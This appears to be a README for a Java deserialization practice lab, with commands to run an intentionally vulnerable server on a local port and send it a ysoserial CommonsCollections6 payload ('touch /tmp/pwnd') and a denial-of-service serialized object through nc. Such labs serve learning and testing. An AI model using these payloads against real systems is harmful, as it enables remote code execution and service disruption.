# Java-Deserialization-Basics

```sh
javac Vulnerable.java  
java Vulnerable 12345 // listens on port 12345  
```
or for testing ysoserial payloads  
```sh
java -cp .:lib/* Vulnerable 12345  
java -jar lib/ysoserial.jar CommonsCollections6 "touch /tmp/pwnd" | nc 127.0.0.1 12345  
```    
SerialDOS is simply https://gist.github.com/coekie/a27cc406fc9f3dc7a70d changed so it generates file dos.ser  
```sh
javac SerialDOS.java  
java SerialDOS  
cat dos.ser | nc 127.0.0.1 12345  
```    
    
There is no ysoserial.jar in lib/ because it's almost 50MB large. Use your own or download new release from
https://github.com/frohoff/ysoserial  
